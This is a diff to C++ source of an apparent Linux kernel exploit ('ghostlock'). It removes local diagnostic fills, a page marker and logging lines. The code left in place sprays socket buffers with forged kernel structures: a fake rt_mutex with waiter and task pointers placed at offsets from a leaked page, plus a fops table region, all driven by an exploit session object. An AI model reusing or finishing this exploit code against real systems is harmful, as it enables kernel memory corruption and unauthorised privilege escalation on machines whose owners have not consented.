@@ -482,26 +482,6 @@ namespace ghostlock::support {
         for (size_t chunk = 0; chunk < kernel::SKB_SEND_SIZE; chunk += kernel::ORDER3_SIZE) {
             unsigned char *p = skb_buf() + chunk + chunk_bias;
 
-            /* LOCAL DIAGNOSTIC (not for upstream): self-locating buffer.
-             * SKB_DATA_DELTA/LOCK_OFF are hardcoded upstream constants that
-             * decide where these bytes land relative to the leaked page, and
-             * measurement (run 21:27, `rz` mk=0) says they do not hold on
-             * diting. So make the buffer say where it went: in the two regions
-             * a chunk never uses, every word carries its own (chunk, offset).
-             * One probe read then decodes the real mapping instead of trusting
-             * the constant. Payload fields are written after this fill and
-             * overwrite their own offsets, so the dance sees an intact payload.
-             * Values are recognizable by their top 32 bits (0x7A5C0000|chunk).
-             * See docs/analysis/payload-page-identity-plan.md. */
-            const uint64_t chunk_tag = chunk / kernel::ORDER3_SIZE;
-            const uint64_t fill_base = 0x7A5C000000000000ULL | (chunk_tag << 32);
-            for (size_t off = 0; off < kernel::LOCK_OFF; off += sizeof(uint64_t)) {
-                put64(p, off, fill_base | off);
-            }
-            for (size_t off = 0x2000; off < kernel::ORDER3_SIZE; off += sizeof(uint64_t)) {
-                put64(p, off, fill_base | off);
-            }
-
             put32(p, kernel::LOCK_OFF + 0x00, 0);
             /* lock->waiters.rb_root.rb_node = NULL, rb_leftmost = the page waiter.
              *
@@ -524,16 +504,6 @@ namespace ghostlock::support {
             put64(p, kernel::LOCK_OFF + 0x08, 0);
             put64(p, kernel::LOCK_OFF + 0x10, (session::g_exploit_session.heap.current.fake_w0));
             put64(p, kernel::LOCK_OFF + 0x18, (session::g_exploit_session.heap.current.fake_task) | 1);
-            /* LOCAL DIAGNOSTIC (not for upstream): inert page marker.
-             * Buffer offset LOCK_OFF + 0x80 (= 0xf00) maps to VA base + 0x80,
-             * the gap between the fake rt_mutex (base + 0x00..0x20) and the
-             * fops table (base + 0x100). Nothing in the dance reads or writes
-             * that word, so the walk cannot rewrite it: if the `rz` probe reads
-             * it back at the descent, the payload page really is the page the
-             * walk is using; if it reads foreign, the buffer never landed on
-             * `base`. Read with `mk=+0x78(%x1)` (x1 = base + 8).
-             * See docs/analysis/payload-page-identity-plan.md. */
-            put64(p, kernel::LOCK_OFF + 0x80, 0xdeadbeefcafe0000ULL | chunk_tag);
 
             if (compact) {
                 /* Words ride the erase relink: pc = value, rb_left = dest,
@@ -903,24 +873,11 @@ namespace ghostlock::support {
         pr_info("[spray] payload ready +%lldms\n", ms_since(&t_spray));
         snitch.reset();
 
-        /* LOCAL DIAGNOSTIC (not for upstream): the post-payload reap burst is
-         * where every recent run dies ("payload ready" is the last line the
-         * streamer sees). Progress lines make the burst measurable: if the log
-         * stops between two of them the death is inside child i's exit, and
-         * which i tells us whether it is a fixed child or dice. */
-        pr_info("[spray] reap burst start n=%zu +%lldms\n",
-                prepare_ctx.childs.size(), ms_since(&t_spray));
         for (size_t i = 0; i < prepare_ctx.childs.size(); i++) {
             SYSCHK(close(prepare_ctx.memfds[i]));
             prepare_ctx.memfds[i] = -1;
             kill_child(prepare_ctx.childs[i]);
-            if ((i & 31) == 31) {
-                pr_info("[spray] reap %zu/%zu +%lldms\n", i + 1,
-                        prepare_ctx.childs.size(), ms_since(&t_spray));
-            }
         }
-        pr_info("[spray] reap burst done n=%zu +%lldms\n",
-                prepare_ctx.childs.size(), ms_since(&t_spray));
 
         return base;
     }
